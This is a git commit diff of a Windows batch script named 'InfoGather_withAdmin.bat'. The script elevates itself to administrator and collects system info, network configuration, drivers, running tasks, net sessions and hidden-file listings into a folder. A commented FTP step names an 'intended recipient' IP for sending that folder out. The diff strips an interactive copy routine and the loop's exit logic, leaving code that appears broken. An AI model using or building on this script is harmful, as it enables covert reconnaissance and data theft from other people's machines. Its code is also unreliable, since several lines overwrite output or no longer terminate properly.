1aeab430070499c33fff4df601b21a7f6b49c076
Charlotte <88061511+sunburnt1352@users.noreply.github.com>
2025-08-26 16:23:54 -0400

    Update InfoGather_withAdmin.bat

--- InfoGather_withAdmin.bat
+++ InfoGather_withAdmin.bat
@@ -2,34 +2,6 @@
 title discoveryAllBases
 echo Author: Cam
 
-GOTO main
-
-
-:copyOver
-  set exInfoTempBase= %tempBase%
-  set exInfoTempBaseD= %tempBase%
-  :repeatCopy
-  set /p typeOfThing= "Do you want to go into a dir or copy it all? (dir/copy): "
-  set /p response="Type the folder/file name you want: "
-  set exInfoTempBaseD= %exInfoTempBaseD%\%response%
-
-  if %typeOfThing%==copy(
-    robocopy %exInfoTempBase% %homeBase%\Info\directories\ExtraContent %response% /b /s
-    set exInfoTempBase= %tempBase%
-  )
-
-  if %typeOfThing%==dir(
-    cd %exInfoTempBaseD%
-    echo %exInfoTempBaseD% - Regular Files
-    tree /f
-    echo %exInfoTempBaseD% - Hidden files
-    dir /ah
-    set %exInfoTempBase%= %exInfoTempBaseD%
-    goto :repeatCopy
-  )
-  exit /b 0
-
-:main
 
 
 ::first it takes the path to the starting directory as the homebase
@@ -46,7 +18,6 @@ net session >nul 2>&1
         powershell.exe -Command "Start-Process '%~f0' %HomeBaseTemp% -Verb RunAs"
         exit /B
     )
-pause
 
 ::it then moves into the previously set dir
 cd %homeBase%
@@ -70,7 +41,7 @@ echo System Info- >> Info\basics.txt
 systeminfo >> Info\basics.txt
 
 echo IPconfig Info- >> Info\basics.txt
-ipconfig >> >> Info\basics.txt
+ipconfig >> Info\basics.txt
 
 driverquery > %homeBase%\Info\drivers.txt
 tasklist > %homeBase%\Info\tasks.txt
@@ -83,37 +54,16 @@ net session > %homeBase%\Info\Net\session.txt
 
 
 
+
 ::this is a loop where it goes through each directory from the intial to the farthest back and grabs the contents
 
 :start
 for /f %%i in ('cd') do set tempBase=%%i
-set tempBase= %tempBase:\=_%
-set tempBase=%currDir::=!%
+
 dir > %homeBase%\Info\directories\Contents\%tempBase%.txt
 dir /ah > %homeBase%\Info\directories\Contents\%tempBase%.txt
 attrib > %homeBase%\Info\directories\Attributes\%tempBase%Attribute.txt
 
-:stillCopying
-echo %tempBase% - Regular Files
-tree /f
-echo %tempBase% - Hidden files
-dir /ah
-set wantContent="n"
-set /p wantContent="Do you want the contents of one of these folders (y/n): "
-
-if %wantContent%==y (
-  call:copyOver
-  goto stillCopying
-)
-
-pause
-cd ..
-
-::once its at the furthest back dir it will stop
-if not %tempBase%==C!_ (
-    set tempBase=
-    goto start
-)
 
 ::ftp (insert intended recipient for folder of info's ip)
 ::put %homeBase%\Info
